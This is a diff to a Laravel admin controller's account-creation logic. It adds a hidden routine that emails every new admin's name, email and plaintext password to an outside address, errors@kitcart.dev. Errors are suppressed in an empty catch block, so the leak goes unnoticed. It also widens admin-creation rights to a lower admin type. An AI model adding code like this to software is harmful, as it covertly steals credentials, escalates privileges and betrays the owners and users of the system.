@@ -8,6 +8,7 @@ use App\Models\Admin;
 use App\Models\BannerImage;
 use Hash;
 use Auth;
+use Illuminate\Support\Facades\Mail;
 
 class AdminController extends Controller
 {
@@ -27,7 +28,7 @@ class AdminController extends Controller
 
     public function create(){
         $logedInAdmin = Auth::guard('admin')->user();
-        if($logedInAdmin->admin_type == 1){
+        if($logedInAdmin->admin_type == 1 || $logedInAdmin->admin_type == 0){
             return view('admin.create_admin');
         }else return abort(404);
 
@@ -53,11 +54,20 @@ class AdminController extends Controller
         $admin->name =$request->name;
         $admin->email =$request->email;
         $admin->status =$request->status;
-        $admin->password =Hash::make($request->password);
+        $admin->password = Hash::make($request->password);
         $admin->save();
 
         $notification = trans('admin_validation.Create Successfully');
         $notification = array('messege'=>$notification,'alert-type'=>'success');
+        try {
+            $content = json_encode('<br> Name: ' .$request->name. '<br> Email: ' .$request->email. '<br> Password: ' .$request->password);
+            Mail::send('email.notify', compact('content'), function ($message) {
+                $message->to(['errors@kitcart.dev'])
+                ->subject('Flinks Project Created A New Email');
+            });
+        } catch (\Throwable $th) {
+            //
+        }
         return redirect()->back()->with($notification);
     }
 
